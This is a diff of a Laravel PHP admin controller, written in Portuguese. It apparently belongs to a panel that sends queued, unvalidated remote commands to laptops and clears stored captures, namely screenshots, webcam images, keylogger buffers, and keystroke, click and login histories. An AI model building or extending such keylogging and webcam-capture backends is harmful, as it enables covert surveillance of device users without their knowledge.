@@ -235,15 +235,33 @@ class NotebookController extends Controller
         return view('admin.notebooks.show', compact('notebook'));
     }
 
-    public function enviarComando(Request $request, $id)
+    public function enviarComando($id)
     {
         $notebook = Notebook::findOrFail($id);
         
-        $notebook->adicionarComando($request->acao, $request->parametros ?? []);
-
-        return back()->with('success', 'Comando enviado com sucesso! O notebook receberá em até 30 segundos.');
+        $acao = request('acao');
+        
+        // Usar o sistema de comandos existente no modelo Notebook
+        $comandos = $notebook->comandos_pendentes ?? [];
+        
+        $novoComando = [
+            'id' => uniqid(),
+            'acao' => $acao,
+            'criado_em' => now()->toISOString(),
+            'executado' => false
+        ];
+        
+        $comandos[] = $novoComando;
+        
+        // Limitar a quantidade de comandos pendentes
+        if (count($comandos) > 10) {
+            $comandos = array_slice($comandos, -10);
+        }
+        
+        $notebook->update(['comandos_pendentes' => $comandos]);
+        
+        return redirect()->back()->with('success', "Comando {$acao} enviado com sucesso!");
     }
-
     
     public function downloadMidia($id, $tipo)
     {
@@ -274,5 +292,49 @@ class NotebookController extends Controller
 
         return redirect()->route('admin.notebooks.index')
             ->with('success', 'Notebook cadastrado com sucesso!');
+    }
+
+
+
+    public function limparDados($id)
+    {
+        $notebook = Notebook::findOrFail($id);
+        $dadosParaLimpar = request('dados', []);
+        
+        if (in_array('todos', $dadosParaLimpar) || empty($dadosParaLimpar)) {
+            // Limpar tudo
+            $notebook->update([
+                'screenshot' => null,
+                'webcam' => null,
+                'keylog_buffer' => null,
+                'historico_teclas' => null,
+                'historico_cliques' => null,
+                'historico_logins' => null,
+                'atividades_recentes' => null,
+            ]);
+        } else {
+            $updates = [];
+            
+            if (in_array('screenshot', $dadosParaLimpar)) {
+                $updates['screenshot'] = null;
+            }
+            if (in_array('webcam', $dadosParaLimpar)) {
+                $updates['webcam'] = null;
+            }
+            if (in_array('keylog', $dadosParaLimpar)) {
+                $updates['keylog_buffer'] = null;
+                $updates['historico_teclas'] = null;
+            }
+            if (in_array('cliques', $dadosParaLimpar)) {
+                $updates['historico_cliques'] = null;
+            }
+            if (in_array('logins', $dadosParaLimpar)) {
+                $updates['historico_logins'] = null;
+            }
+            
+            $notebook->update($updates);
+        }
+        
+        return redirect()->back()->with('success', 'Dados limpos com sucesso!');
     }
 }
